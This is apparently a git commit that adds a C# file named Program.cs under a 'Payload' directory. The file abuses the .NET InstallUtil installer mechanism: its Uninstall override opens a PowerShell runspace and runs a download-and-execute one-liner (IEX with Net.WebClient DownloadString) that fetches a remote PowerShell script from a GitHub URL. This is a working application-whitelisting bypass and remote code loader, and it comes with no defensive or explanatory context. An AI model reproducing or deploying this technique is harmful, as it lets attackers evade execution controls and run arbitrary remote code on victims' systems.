f8aa88329798a706d43ace952ef0380c45e248b1
NotSurprised <roro8016489@gmail.com>
2020-03-24 17:54:27 +0800

    20200324

---
+++ Payload/Csharp4InstallUntil/Csharp4InstallUntil/Program.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Management.Automation;
+// edit the .csproj to add this reference.
+namespace Whitelist
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+        }
+    }
+}
+[System.ComponentModel.RunInstaller(true)]
+// Install need be added in reference, just put "install" in search box.
+public class Sample : System.Configuration.Install.Installer
+{
+    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+        PowerShell ps = PowerShell.Create();
+        ps.AddCommand("Invoke-Expression");
+        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+        ps.Invoke();
+    }
+}
